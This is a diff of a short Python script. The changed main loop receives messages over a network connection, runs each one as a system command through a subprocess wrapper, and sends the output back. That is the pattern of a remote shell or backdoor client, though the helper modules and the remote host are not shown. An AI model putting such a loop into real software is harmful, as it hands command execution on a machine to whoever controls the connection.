@@ -1,25 +1,13 @@
 import client_handler
 import subprocess_handler
-import time
 
-s = subprocess_handler.Subprocess()
-s.start()
+subprocess = subprocess_handler.Subprocess()
+subprocess.start()
 
-c = client_handler.Client()
-c.start()
-c.open_connect()
-
-
-
+client = client_handler.Client()
+client.start()
+client.open_connect()
 
 while True:
-    message = c.receive_message()
-
-    if message == "disconnect":
-        s.managing_the_subprocess('kill')
-        break
-    else:
-        s.managing_the_subprocess(message)
-
-    if not c.check_connection():
-        c.open_connect()
+    client.send_message(subprocess.execute_command(client.receive_message()))
+client.close_connect()
